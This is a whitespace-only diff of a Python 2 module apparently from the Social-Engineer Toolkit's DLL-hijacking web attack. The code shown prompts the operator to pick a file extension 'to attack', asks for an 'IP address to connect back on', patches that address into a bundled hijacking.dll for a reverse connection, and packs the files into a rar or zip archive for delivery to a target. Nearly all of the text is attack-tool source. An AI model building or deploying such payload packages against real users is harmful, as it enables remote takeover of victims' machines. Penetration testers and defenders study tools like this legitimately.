@@ -16,11 +16,11 @@ from src.core.setcore import *
 definepath=os.getcwd()
 
 try:
-        import zipfile
+    import zipfile
 except ImportError, error:
-        log(error) 
-        print "Module 'zipfile' was not detected, please download and install the python zipfile module"
-        exit_set()
+    log(error)
+    print "Module 'zipfile' was not detected, please download and install the python zipfile module"
+    exit_set()
 
 print dll_hijacker_text
 
@@ -31,15 +31,15 @@ fileopen=file("src/webattack/dll_hijacking/repository", "r")
 print "   Enter the choice of the file extension you want to attack:\n"
 counter=1
 for line in fileopen:
-        line=line.split(",")
-        print "    " + str(counter)+". "+line[0]
-        counter=counter+1
+    line=line.split(",")
+    print "    " + str(counter)+". "+line[0]
+    counter=counter+1
 
 print "\n"
 choice=raw_input(setprompt(["2","15"], ""))
 
 if choice == 'exit':
-        exit_set()
+    exit_set()
 
 if choice == "": choice="1"
 
@@ -49,12 +49,12 @@ choice=int(choice)
 counter=1
 fileopen=file("src/webattack/dll_hijacking/repository", "r")
 for line in fileopen:
-        line=line.split(",")
-        if int(counter) == int(choice):
-                name=line[0].rstrip()
-                extension="."+line[1].rstrip()
-                dll=line[2].rstrip()
-        counter=counter+1
+    line=line.split(",")
+    if int(counter) == int(choice):
+        name=line[0].rstrip()
+        extension="."+line[1].rstrip()
+        dll=line[2].rstrip()
+    counter=counter+1
 
 print "\n   [*] You have selected the file extension of %s and vulnerable dll of %s" % (extension,dll)
 
@@ -69,10 +69,10 @@ filewrite.write("EMPTY")
 filewrite.close()
 
 if check_options("IPADDR=") != 0:
-	ipaddr = check_options("IPADDR=")
+    ipaddr = check_options("IPADDR=")
 else:
-	ipaddr=raw_input(setprompt(["2","15"], "IP address to connect back on"))
-	update_options("IPADDR=" + ipaddr)
+    ipaddr=raw_input(setprompt(["2","15"], "IP address to connect back on"))
+    update_options("IPADDR=" + ipaddr)
 
 # replace ipaddress with one that we need for reverse connection back
 fileopen=open("src/webattack/dll_hijacking/hijacking.dll" , "rb")
@@ -90,7 +90,7 @@ filewrite.close()
 print """
 Do you want to use a zipfile or rar file. Problem with zip
 is they will have to extract the files first, you can't just
-open the file from inside the zip. Rar does not have this 
+open the file from inside the zip. Rar does not have this
 restriction and is more reliable
 
 1. Rar File
@@ -103,37 +103,37 @@ choice=raw_input(setprompt(["2","15"], "[rar]"))
 if choice == "": choice = "1"
 # if its not a rar file
 if choice != "1":
-        # if its not a zipfile, you messed up
-        if choice != "2":
-                # default to rar file
-                choice = "1"
+    # if its not a zipfile, you messed up
+    if choice != "2":
+        # default to rar file
+        choice = "1"
 
 # if its choice 1 do some rar stuff
 if choice == "1":
-        
-        # basic counter
-        counter=0
-        # look for rar in default directories
-        rar_check = subprocess.Popen("rar",shell=True, stdout=subprocess.PIPE)
-        # comunicate with the process
-        stdout_value = rar_check.communicate()[0]
-        # do a search to see if rar is present
-        match=re.search("Add files to archive", stdout_value)
-        # we get a hit?
-        if match:
-                subprocess.Popen("cd src/program_junk/dll;rar a %s/src/program_junk/template.rar * 1> /dev/null 2> /dev/null" % (definepath), shell=True).wait()
-                counter=1
 
-        # if we didnt find rar
-        if counter == 0:
-                print "[!] Error, rar was not detected. Please download rar and place it in your /usr/bin or /usr/local/bin directory."
-                print "[*] Defaulting to zipfile for the attack vector. Sorry boss."
-                choice = "2"
-                        
+    # basic counter
+    counter=0
+    # look for rar in default directories
+    rar_check = subprocess.Popen("rar",shell=True, stdout=subprocess.PIPE)
+    # comunicate with the process
+    stdout_value = rar_check.communicate()[0]
+    # do a search to see if rar is present
+    match=re.search("Add files to archive", stdout_value)
+    # we get a hit?
+    if match:
+        subprocess.Popen("cd src/program_junk/dll;rar a %s/src/program_junk/template.rar * 1> /dev/null 2> /dev/null" % (definepath), shell=True).wait()
+        counter=1
+
+    # if we didnt find rar
+    if counter == 0:
+        print "[!] Error, rar was not detected. Please download rar and place it in your /usr/bin or /usr/local/bin directory."
+        print "[*] Defaulting to zipfile for the attack vector. Sorry boss."
+        choice = "2"
+
 # if its a zipfile zip the badboy up
 if choice == "2":
-        # write to a zipfile here
-        file = zipfile.ZipFile("src/program_junk/template.zip", "w")
-        for name in glob.glob("src/program_junk/dll/*"):
-            file.write(name, os.path.basename(name), zipfile.ZIP_DEFLATED)
-        file.close()
+    # write to a zipfile here
+    file = zipfile.ZipFile("src/program_junk/template.zip", "w")
+    for name in glob.glob("src/program_junk/dll/*"):
+        file.write(name, os.path.basename(name), zipfile.ZIP_DEFLATED)
+    file.close()
